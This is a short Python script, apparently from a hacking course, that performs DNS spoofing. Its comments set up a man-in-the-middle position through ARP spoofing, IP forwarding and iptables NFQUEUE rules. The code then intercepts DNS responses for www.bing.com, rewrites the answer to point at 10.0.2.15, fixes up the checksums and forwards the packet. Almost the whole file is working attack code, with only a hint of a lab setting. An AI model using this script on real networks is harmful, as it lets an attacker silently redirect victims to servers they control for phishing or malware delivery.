#!/usr/bin/env python

# Remember we first have to be the Man in the Middle can do this via arp spoofing to redirect traffic
# echo 1 > /proc/sys/net/ipv4/ip_forward
# trap packets in queue using iptables -I FORWARD -j NFQUEUE --queue-num 0
# below two iptable rules are for local testing - use the above for real life min
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# this is an underlying system setting and not python dependent, we will use python to read the Q
# ! will need this: pip install netfilterqueue
# needed to do this on Kali - apt-get install build-essential python-dev libnetfilter-queue-dev
# remember to iptables --flush when done

import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    # DNSRR - for response [DNS Resource Record]
    # DNSRQ - for request [DNS Question Record]
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print("[+] Spoofing target")
            #rdata = the IP address you want to redirect the target to, usually a web server
            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.15")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1
            # scapy will recreate packet checksum for us :)

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


# will cut traffic
# packet.drop()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
